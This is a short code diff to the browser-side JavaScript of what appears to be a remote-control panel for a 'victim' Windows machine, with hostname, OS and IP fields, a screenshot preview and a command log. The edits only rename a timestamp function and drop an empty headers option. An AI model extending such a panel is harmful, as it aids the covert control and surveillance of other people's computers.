@@ -62,7 +62,7 @@ const resultPanel = document.getElementById('result-panel');
 const screenshotPreview = document.getElementById('screenshot-preview');
 const activityLog = document.getElementById('activity-log');
 
-function now() {
+function getFormattedTime() {
   return new Date().toLocaleTimeString('fr-FR', { hour12: false });
 }
 
@@ -71,7 +71,7 @@ function addLog(command, output, status = 'success') {
   const item = document.createElement('div');
   const shortResult = typeof output === 'string' ? output.slice(0, 70) : JSON.stringify(output).slice(0, 70);
   item.className = color;
-  item.textContent = `[${now()}] ► ${command} → ${shortResult}`;
+  item.textContent = `[${getFormattedTime()}] ► ${command} → ${shortResult}`;
   activityLog.appendChild(item);
   activityLog.scrollTop = activityLog.scrollHeight;
 }
@@ -248,7 +248,7 @@ function renderControls() {
 
 async function updateStatus() {
   try {
-    const data = await requestJSON('/api/status', { headers: {} });
+    const data = await requestJSON('/api/status');
     document.getElementById('victim-hostname').textContent = data.hostname || 'WINDOWS-TARGET';
     document.getElementById('victim-os').textContent = `OS: ${data.os || 'Unknown'}`;
     document.getElementById('victim-ip').textContent = `IP: ${data.ip || 'N/A'}`;
